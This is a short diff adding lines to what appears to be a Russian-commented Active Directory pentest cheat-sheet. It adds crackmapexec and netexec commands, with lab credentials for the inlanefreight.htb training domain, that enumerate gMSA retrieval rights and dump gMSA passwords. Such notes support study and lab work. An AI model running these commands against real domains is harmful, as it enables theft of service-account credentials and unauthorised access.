@@ -195,6 +195,13 @@
 
 	# Для какой учетной записи ---> password-not-required
 	crackmapexec ldap <target> -u <u> -p <p> --password-not-required
+
+	# Перечисление учетных записей с привилегиями gMSA
+	nxc winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"
+
+	# Получение пароля gMSA 
+	crackmapexec ldap dc01.inlanefreight.htb -u engels -p Inlanefreight1998! --gmsa
+	
 	
 # clock sync
 
